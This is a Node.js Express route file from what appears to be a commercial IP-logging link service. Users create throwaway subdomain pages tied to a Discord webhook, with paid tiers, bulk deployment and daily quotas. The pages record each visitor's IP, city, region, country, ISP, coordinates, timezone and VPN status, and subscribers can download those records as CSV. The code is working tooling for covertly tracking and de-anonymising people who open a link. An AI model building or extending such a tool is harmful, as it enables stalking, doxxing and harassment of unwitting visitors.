const express = require('express');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const User = require('../models/User');
const Deployment = require('../models/Deployment');
const { generateDeployedPage } = require('../utils/deployPage');
const router = express.Router();

function checkToken(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  try {
    const decoded = jwt.verify(authHeader.split(' ')[1], process.env.JWT_SECRET);
    req.userId = decoded.userId;
    next();
  } catch (error) {
    res.status(403).json({ error: 'Invalid token' });
  }
}

// ===== GET MY DEPLOYMENTS =====
router.get('/my', checkToken, async (req, res) => {
  try {
    const deployments = await Deployment.find({ userId: req.userId, active: true }).sort({ createdAt: -1 });
    res.json({ deployments });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ===== GET ALL DEPLOYMENTS (HISTORY) =====
router.get('/all', checkToken, async (req, res) => {
  try {
    const deployments = await Deployment.find({ userId: req.userId }).sort({ createdAt: -1 });
    res.json({ deployments });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ===== NEW DEPLOYMENT =====
router.post('/new', checkToken, async (req, res) => {
  try {
    const user = await User.findById(req.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });
    if (!user.webhook) return res.status(400).json({ error: 'Set Discord webhook first' });

    const today = new Date().toDateString();
    let dailyLimit = 2;
    if (user.plan === 'pro') dailyLimit = 10;
    if (user.plan === 'elite') dailyLimit = 50;
    if (user.plan === 'lifetime') dailyLimit = 999;
    if (user.role === 'owner') dailyLimit = 999;

    if (user.lastDeployDate === today && user.dailyDeploys >= dailyLimit) {
      return res.status(429).json({ error: 'Daily limit reached', limit: dailyLimit, used: user.dailyDeploys });
    }

    let hours = 1;
    if (user.plan === 'pro') hours = 24;
    if (user.plan === 'elite') hours = 48;
    if (user.plan === 'lifetime') hours = 9999;
    if (user.role === 'owner') hours = 9999;

    const expiresAt = new Date();
    expiresAt.setHours(expiresAt.getHours() + hours);

    const subdomain = `${crypto.randomBytes(4).toString('hex')}-${user._id.toString().slice(-6)}`;
    const url = `https://${subdomain}.${process.env.DOMAIN}`;
    const pageHTML = await generateDeployedPage(user.webhook, subdomain, user._id);

    const deployment = new Deployment({
      userId: user._id,
      subdomain,
      url,
      webhook: user.webhook,
      pageHTML,
      expiresAt,
      active: true
    });
    await deployment.save();

    if (user.lastDeployDate === today) {
      user.dailyDeploys++;
    } else {
      user.dailyDeploys = 1;
      user.lastDeployDate = today;
    }
    await user.save();

    res.json({ success: true, url, subdomain, expiresAt, expiresIn: `${hours} hour${hours > 1 ? 's' : ''}` });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ===== DELETE DEPLOYMENT =====
router.delete('/:subdomain', checkToken, async (req, res) => {
  try {
    const deployment = await Deployment.findOne({ subdomain: req.params.subdomain });
    if (!deployment) return res.status(404).json({ error: 'Not found' });
    if (deployment.userId.toString() !== req.userId) return res.status(403).json({ error: 'Not yours' });
    deployment.active = false;
    await deployment.save();
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ===== EXPORT DATA (CSV) - Pro+ =====
router.get('/export/:subdomain', checkToken, async (req, res) => {
  try {
    const user = await User.findById(req.userId);
    if (!user || (user.plan !== 'pro' && user.plan !== 'elite' && user.plan !== 'lifetime' && user.role !== 'owner')) {
      return res.status(403).json({ error: 'Upgrade to Pro or higher to export data' });
    }
    
    const deployment = await Deployment.findOne({ subdomain: req.params.subdomain, userId: req.userId });
    if (!deployment) return res.status(404).json({ error: 'Deployment not found' });
    
    let csv = 'IP,City,Region,Country,ISP,Lat,Lon,Timezone,VPN,Timestamp\n';
    deployment.ips.forEach(entry => {
      csv += `${entry.ip},${entry.city},${entry.region},${entry.country},${entry.isp},${entry.lat},${entry.lon},${entry.timezone},${entry.vpn},${entry.timestamp}\n`;
    });
    
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', `attachment; filename=deployment-${req.params.subdomain}-logs.csv`);
    res.send(csv);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ===== EXPORT ALL LOGS (CSV) =====
router.get('/export-all', checkToken, async (req, res) => {
  try {
    const user = await User.findById(req.userId);
    if (!user || (user.plan !== 'pro' && user.plan !== 'elite' && user.plan !== 'lifetime' && user.role !== 'owner')) {
      return res.status(403).json({ error: 'Upgrade to Pro or higher to export data' });
    }
    
    const deployments = await Deployment.find({ userId: req.userId });
    let csv = 'Subdomain,URL,Visits,IP,City,Region,Country,ISP,Lat,Lon,Timezone,VPN,Timestamp\n';
    
    deployments.forEach(d => {
      d.ips.forEach(entry => {
        csv += `${d.subdomain},${d.url},${d.visits},${entry.ip},${entry.city},${entry.region},${entry.country},${entry.isp},${entry.lat},${entry.lon},${entry.timezone},${entry.vpn},${entry.timestamp}\n`;
      });
    });
    
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', 'attachment; filename=all-logs.csv');
    res.send(csv);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ===== BULK DEPLOY =====
router.post('/bulk', checkToken, async (req, res) => {
  try {
    const user = await User.findById(req.userId);
    if (!user || (user.plan !== 'elite' && user.plan !== 'lifetime' && user.role !== 'owner')) {
      return res.status(403).json({ error: 'Bulk deploy requires Elite or Lifetime plan' });
    }
    
    const { count } = req.body;
    if (!count || count < 1 || count > 10) {
      return res.status(400).json({ error: 'Bulk deploy: 1-10 links at a time' });
    }
    
    const today = new Date().toDateString();
    let dailyLimit = user.plan === 'elite' ? 50 : 999;
    if (user.role === 'owner') dailyLimit = 999;
    
    if (user.lastDeployDate === today && user.dailyDeploys >= dailyLimit) {
      return res.status(429).json({ error: 'Daily limit reached' });
    }
    
    const results = [];
    for (let i = 0; i < count; i++) {
      let hours = user.plan === 'elite' ? 48 : 9999;
      if (user.role === 'owner') hours = 9999;
      
      const expiresAt = new Date();
      expiresAt.setHours(expiresAt.getHours() + hours);
      
      const subdomain = `${crypto.randomBytes(4).toString('hex')}-${user._id.toString().slice(-6)}-${i}`;
      const url = `https://${subdomain}.${process.env.DOMAIN}`;
      const pageHTML = await generateDeployedPage(user.webhook, subdomain, user._id);
      
      const deployment = new Deployment({
        userId: user._id,
        subdomain,
        url,
        webhook: user.webhook,
        pageHTML,
        expiresAt,
        active: true
      });
      await deployment.save();
      results.push({ url, subdomain });
      
      if (user.lastDeployDate === today) {
        user.dailyDeploys++;
      } else {
        user.dailyDeploys = 1;
        user.lastDeployDate = today;
      }
    }
    await user.save();
    
    res.json({ success: true, count, results });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

module.exports = router;
